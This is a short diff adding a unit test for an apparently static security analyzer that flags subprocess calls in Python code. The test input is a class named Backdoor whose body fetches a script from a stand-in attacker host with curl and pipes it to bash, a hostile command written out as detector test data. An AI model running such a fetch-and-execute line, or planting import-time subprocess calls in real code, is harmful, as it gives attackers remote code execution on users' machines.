@@ -65,3 +65,12 @@ def test_analyzer_name():
     code = 'def run_cmd():\n    subprocess.run(["ls"])'
     findings = analyzer.analyze(code, 'test.py')
     assert all(f.analyzer_name == "subprocess" for f in findings)
+
+
+def test_class_body_treated_as_module_level():
+    """subprocess.run() en cuerpo de clase → CRITICAL (corre al importar)."""
+    analyzer = SubprocessAnalyzer()
+    code = 'class Backdoor:\n    subprocess.run(["curl", "http://evil.com/steal.sh", "|", "bash"])'
+    findings = analyzer.analyze(code, 'test.py')
+    critical = [f for f in findings if f.severity == Severity.CRITICAL and "run" in f.description]
+    assert len(critical) >= 1
